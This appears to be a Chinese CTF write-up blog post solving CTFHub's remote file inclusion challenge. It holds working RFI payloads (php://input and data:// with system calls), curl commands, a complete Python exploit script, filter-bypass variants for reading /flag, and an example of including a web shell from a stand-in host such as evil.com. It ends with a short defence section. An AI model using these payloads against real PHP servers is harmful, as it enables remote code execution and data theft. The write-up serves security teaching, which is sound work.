---
layout: post
title: CTFHub - 文件包含 远程包含 Writeup
platform: ctfhub
date: 2026-10-23 19:24:00 +0800
categories: CTF
---

CTFHub - 文件包含 远程包含 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **文件包含** → 远程包含）
- 题型：Web
- 考点：**RFI（远程文件包含）**、`allow_url_include`、`strpos` 过滤绕过


```text
★ 页面源码：

    <?php
    error_reporting(0);
    if (isset($_GET['file'])) {
        if (!strpos($_GET["file"], "flag")) {        // ★ 过滤：路径不能含 flag
            include $_GET["file"];                   // ★ 没有任何前缀限制
        } else {
            echo "Hacker!!!";
        }
    } else {
        highlight_file(__FILE__);
    }
    ?>
    <hr>
    i don't have shell, how to get flag?<br>
    <a href="phpinfo.php">phpinfo</a>

    ★ 与上一题的区别：这次【没有 php:// 前缀限制】
      → 理论上可以包含任意路径、任意 URL → RFI

★ phpinfo 关键配置：

    allow_url_include  = On        ★★★ 远程包含的前提
    allow_url_fopen    = On
    open_basedir       = no value
    disable_functions  = no value

★ 验证过滤器：

    ?file=/flag
    → Hacker!!!          ❌ 被拦（路径里有 flag）

★ 绕过方法 1：php://input（POST body 不被过滤）

    POST /?file=php://input
    Content-Type: text/plain

    <?php system('cat /flag'); ?>

    → ctfhub{f58cbf220dca994bc6bc70dd}      ✅

    ★ 原理：过滤器只检查 URL 的 file 参数
      "php://input" 里没有 flag → 通过
      而真正的代码在 POST body 里 → body 不被检查

★ 绕过方法 2：data:// + 通配符（纯 GET）

    ?file=php://filter/resource=data://text/plain,<?php system('cat /f*');?>

    → ctfhub{f58cbf220dca994bc6bc70dd}      ✅

    ★ 原理：用 cat /f* 代替 cat /flag
      → 参数里没有 "flag" 字样 → 通过过滤器
      → shell 的通配符把 /f* 展开成 /flag

★ 先 ls 确认 flag 位置：

    ?file=php://filter/resource=data://text/plain,<?php system('ls -la /');?>
    → -rw-r--r-- 1 root root 33 flag

flag         : ctfhub{f58cbf220dca994bc6bc70dd}
```

二、题目分析

**① 什么是 RFI（远程文件包含）**

```
LFI（本地文件包含）：
    include $_GET['file'];
    ?file=../../etc/passwd        ← 包含【服务器上】的文件

RFI（远程文件包含）：
    include $_GET['file'];
    ?file=http://evil.com/shell.txt   ← 包含【远程服务器】的文件
    → PHP 去 evil.com 下载那个文件 → 当 PHP 代码执行 → RCE
```

**★ RFI 比 LFI 更危险**：

```
LFI：只能读服务器上已有的文件（除非配合日志/上传）
RFI：攻击者可以提供【任意代码】，直接 RCE
```

**② RFI 的前提条件**

```ini
allow_url_include = On      ; 允许 include 远程 URL（默认 Off）
allow_url_fopen   = On      ; 允许打开远程 URL（默认 On）
```

**★ 两个都要 On。**

**本题实测**：

```
allow_url_include = On      ← 满足条件
allow_url_fopen   = On      ← 满足条件
```

**③ 本题的过滤：`!strpos($file, "flag")`**

```php
if (!strpos($_GET["file"], "flag")) {
    include $_GET["file"];
} else {
    echo "Hacker!!!";
}
```

**这个过滤想干什么**：

```
阻止你直接包含 /flag 这个文件
    ?file=/flag           → strpos = 1 → 拦截
    ?file=../../flag      → strpos = 3 → 拦截
```

**但它有两个致命缺陷**：

**缺陷 1：只检查 URL 参数，不检查"实际内容"**

```
?file=php://input
    → 参数里没有 "flag" → 通过
    → 但 POST body 里有 "cat /flag" → body 不被检查
```

**缺陷 2：只做字符串匹配，不防"变体写法"**

```
cat /flag     → 含 "flag" → 如果写在参数里会被拦
cat /f*       → 不含 "flag" → 通过
              → shell 展开 /f* → /flag ✅
```

**★ 这两个缺陷是"输入过滤"的典型失败方式**：

```
① 只过滤了一个入口（URL），漏了其他入口（POST body）
② 只匹配了字面量，没考虑 shell 通配符/变量/编码等变体
```

**④ 绕过方法 1 详解：`php://input`**

```http
POST /?file=php://input HTTP/1.1
Content-Type: text/plain

<?php system('cat /flag'); ?>
```

**执行流程**：

```
① 过滤检查：strpos("php://input", "flag") → false → 通过 ✅
② include('php://input')
③ php://input 读取 POST 请求体 → "<?php system('cat /flag'); ?>"
④ include 拿到内容 → 当 PHP 代码解析 → 执行
⑤ system('cat /flag') → 输出 flag
```

**★ 核心思路：把 payload 从"被过滤的地方"挪到"不被过滤的地方"**

```
被过滤：URL 的 ?file= 参数
不被过滤：POST body（因为代码只检查 $_GET）

→ 用 php://input 把两者连起来
```

**⑤ 绕过方法 2 详解：`cat /f*` 通配符**

```php
?file=php://filter/resource=data://text/plain,<?php system('cat /f*');?>
```

**为什么用 `/f*`**：

```bash
# shell 的通配符展开
cat /f*        →  cat /flag        （如果根目录只有 /flag 开头 f 的文件）
ls /f*         →  /flag
```

**★ 参数里写 `/f*` 不含 "flag" → 通过过滤
   shell 执行时展开成 `/flag` → 读到 flag**

**更稳的写法（避免匹配到多个文件）**：

```bash
cat /fla?         # ? 匹配单个字符
cat /flag         # 不行（含 flag）
```

**★ 其他通配符变体**：

```bash
ls /f*            # 列出所有 f 开头的
cat /f*           # 拼接输出所有 f 开头的文件
cat /fl?g         # ? 匹配一个字符
cat /[f]lag       # 字符类
cat /"fl"ag       # 引号拼接（bash 会去掉引号）
```

**⑥ 为什么 `php://filter` 包了一层**

```
直接写：  ?file=data://text/plain,<?php ...?>
问题：    data:// 是合法路径（无前缀限制），应该能直接用

但为了保险（有些环境对 data:// 有额外限制），
用 php://filter 包一层更通用：

    php://filter/resource=data://text/plain,<?php ...?>
```

**★ 其实本题没前缀限制，`data://` 直接写也行**：

```
?file=data://text/plain,<?php system('cat /f*');?>
```

**⑦ 标准的 RFI 打法（需要一个公网服务器）**

**如果有一个能放文件的服务器**：

```bash
# ① 在自己的服务器上放 shell.txt
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.txt

# ② 目标包含它
?file=http://your-server.com/shell.txt&cmd=cat /flag
```

**★ 本题不需要真服务器** —— `data://` 就是"内置的远程文件"。

**对比**：

| 方式 | 需要服务器 | 需要 allow_url_include |
|---|---|---|
| `http://` | ✅ 需要 | ✅ 需要 |
| `ftp://` | ✅ 需要 | ✅ 需要 |
| **`data://`** | ❌ **不需要** | ✅ 需要 |
| **`php://input`** | ❌ 不需要 | ✅ 需要 |

**★ `data://` 和 `php://input` 是"免服务器的 RFI"** —— CTF 里最常用。

三、解题步骤

**第 1 步：看源码，找过滤规则**

```
首页 → highlight_file 显示源码

    if (!strpos($_GET["file"], "flag")) {
        include $_GET["file"];
    }

★ 过滤：路径不能含 "flag"
★ 没有前缀限制 → 可以用任意协议
```

**第 2 步：看 phpinfo，确认 allow_url_include**

```
访问 /phpinfo.php
搜 allow_url_include

→ On      ✅ 可以用 data:// 和 php://input
```

**第 3 步：验证过滤器**

```
?file=/flag
→ Hacker!!!      （确认被拦）
```

**第 4 步：方法一 —— php://input（推荐，最干净）**

**用 Burp**：

```
① Burp → Repeater
② 请求：

    POST /?file=php://input HTTP/1.1
    Host: challenge-xxx:10800
    Content-Type: text/plain
    Content-Length: 30

    <?php system('cat /flag'); ?>

③ Send
④ 响应：ctfhub{...}
```

**用 curl**：

```bash
curl -X POST "http://challenge-xxx:10800/?file=php://input" \
     -H "Content-Type: text/plain" \
     --data '<?php system("cat /flag"); ?>'
```

**⚠️ 注意**：

```
--data 默认把 Content-Type 设成 application/x-www-form-urlencoded
→ 必须显式 -H "Content-Type: text/plain"
→ 否则 PHP 会把 body 解析成 $_POST，php://input 就读不到
```

**第 5 步：方法二 —— data:// + 通配符（纯 GET）**

**浏览器地址栏**：

```
http://challenge-xxx:10800/?file=data://text/plain,<?php system('cat /f*');?>
```

**或者用 php://filter 包一层**：

```
http://challenge-xxx:10800/?file=php://filter/resource=data://text/plain,<?php system('ls -la /');?>
```

**用 curl（避免浏览器编码问题）**：

```bash
curl -G "http://challenge-xxx:10800/" \
     --data-urlencode 'file=data://text/plain,<?php system("cat /f*"); ?>'
```

**第 6 步：提交 → 通关**

---

**完整脚本**

```python
import ssl, urllib.parse, urllib.request

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

BASE = "http://challenge-xxx:10800"
O = "<" + "?" + "php "
C = "?" + ">"


def via_input(cmd):
    """方法 1：php://input（body 不被过滤）"""
    php = O + "system('%s');" % cmd + C
    req = urllib.request.Request(BASE + "/?file=php://input", data=php.encode(), method="POST",
                                 headers={"Content-Type": "text/plain"})
    with urllib.request.urlopen(req, context=CTX, timeout=20) as r:
        return r.read().decode('utf-8', 'replace').split("<hr>")[0].strip()


def via_data(cmd):
    """方法 2：data:// + 通配符（避开 flag 字样）"""
    php = O + "system('%s');" % cmd + C
    payload = "data://text/plain," + php
    u = BASE + "/?file=" + urllib.parse.quote(payload, safe="")
    with urllib.request.urlopen(u, context=CTX, timeout=20) as r:
        return r.read().decode('utf-8', 'replace').split("<hr>")[0].strip()


print(via_input("ls -la /"))
print(via_input("cat /flag"))
print(via_data("cat /f*"))        # ★ 用通配符，避开 "flag"
```

---

**手工操作（浏览器）**

```
① 访问首页看源码 → 知道 filter 挡住 "flag"
② 访问 /phpinfo.php → allow_url_include = On
③ 地址栏输入：

   http://challenge-xxx:10800/?file=data://text/plain,<?php system('ls -la /');?>

   ★ 注意：这段里有 <?php 和 ?>，浏览器可能编码它们
   ★ 如果不行，用 Burp 或 curl

④ 看到 /flag
⑤ 换成 cat /f* ：

   http://challenge-xxx:10800/?file=data://text/plain,<?php system('cat /f*');?>
```

**★ `data://` 的纯 GET 方式最方便，但浏览器对特殊字符的处理不一定友好，
  建议用 curl 或 Burp。**

四、延伸知识

**① RFI 的常见协议**

| 协议 | 例子 | 前提 |
|---|---|---|
| `http://` | `?file=http://evil.com/x.txt` | allow_url_include=On |
| `https://` | 同上 | 同上 |
| `ftp://` | `?file=ftp://evil.com/x.txt` | 同上 |
| `data://` | `?file=data://text/plain,<?php ...?>` | allow_url_include=On |
| `php://input` | POST body | allow_url_include=On |
| `expect://` | `?file=expect://id` | expect 扩展 |

**② `data://` 的语法**

```php
data://[<mediatype>][;base64],<data>

例：
    data://text/plain,Hello                     明文
    data://text/plain;base64,SGVsbG8=           Base64
    data://text/plain;charset=utf-8,<内容>      带字符集
    data://,<?php system('id');?>               省略 mediatype（也可以）
```

**★ 用 Base64 更安全**（避免特殊字符被编码破坏）：

```php
$b64 = base64_encode('<?php system($_GET["cmd"]); ?>');
payload = "data://text/plain;base64," . $b64;
```

**③ 过滤绕过大全（本题涉及的）**

**（1）只过滤一个入口 → 换入口**

```
只查 $_GET['file'] → 把 payload 放 POST body（php://input）
只查 GET + POST   → 放 Cookie（$_REQUEST 会读）
只查参数名        → 换参数名
```

**（2）只匹配字面量 → 用变体**

```bash
cat /flag     → 被拦
cat /f*       → 通过（通配符）
cat /fl?g     → 通过
cat /[f]lag   → 通过
cat /"fl"ag   → 通过
cat $(echo L2ZsYWc= | base64 -d)   → 通过（Base64）
cat /f$(echo lag)                   → 通过（拼接）
```

**（3）大小写**

```bash
cat /FLAG     → 通过过滤器（但 Linux 文件名大小写敏感，可能不存在）
```

**（4）编码**

```bash
?file=%2fflag            URL 编码 /（如果过滤器没解码就检查）
?file=/fla%67            URL 编码 g
?file=/flag              （如果过滤器检查的是 $_GET 原始值，可能被绕过）
```

**★ 但本题的 `$_GET["file"]` 已经解码，所以 URL 编码无效。**

**④ 为什么本题的 `strpos` 还有位置 0 的 bug**

```php
!strpos($s, "flag")

$s = "flag"        → strpos = 0 → !0 = true  → 通过！（bug）
$s = "/flag"       → strpos = 1 → !1 = false → 拦截
```

**实测**：

```
?file=flag         → 通过（但 /var/www/html/flag 不存在）
```

**★ 这个 bug 在本题没利用上（因为 flag 在 /flag，路径不以 flag 开头），
  但它和上一题一样是经典逻辑错误。**

**⑤ 防护**

```text
① ★ 白名单（最有效）
    $allow = ['home', 'about'];
    if (!in_array($page, $allow)) die();

② ★ allow_url_include = Off（这是最重要的一步）
    → http:// / data:// / php://input 全部失效

③ ★ allow_url_fopen = Off（如无必要）

④ ★ open_basedir = /var/www/html
    → 读不到 /flag

⑤ ★ 文件权限隔离
    chmod 600 /flag; chown root:root /flag
    → www-data 读不到

⑥ 不要用用户输入直接拼 include 路径
⑦ 关闭 display_errors（防路径泄露）
```

五、总结

- **本题核心：无前缀限制 + `allow_url_include=On` → 可以包含任意协议 → 用 `php://input` 或 `data://` 免服务器 RCE。**
- 两个 payload（都实测成功）：

```
① POST /?file=php://input
   Content-Type: text/plain
   body: <?php system('cat /flag'); ?>

② GET /?file=data://text/plain,<?php system('cat /f*');?>
```

- **三个必记要点**：

```text
① 过滤器只检查 URL 参数 → 把 payload 挪到 POST body（php://input）
② 过滤器只匹配字面量 → 用 shell 通配符 cat /f* 绕过
③ allow_url_include=On 时，data:// 和 php://input 就是"免服务器的 RFI"
```

- **实测 flag**：

```text
ctfhub{f58cbf220dca994bc6bc70dd}
```


**手工复现要点**：

```text
· 看源码 → 确认有没有前缀限制、有没有过滤
· 看 phpinfo → allow_url_include 是否为 On
· On  → php://input（body 放 payload）或 data://（URL 放 payload）
· 过滤了 "flag" → 用 cat /f* 通配符，或把 payload 挪到 body
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  RFI = include 一个"远程"文件 → 执行远程代码              │
│                                                        │
│  免服务器的两种方式：                                    │
│      php://input  → body 就是"远程文件"                  │
│      data://      → URL 里的数据就是"远程文件"            │
│                                                        │
│  ★ 前提：allow_url_include = On                         │
│  ★ 过滤绕过两条路：换入口（body）、换写法（通配符）        │
└────────────────────────────────────────────────────────┘
```
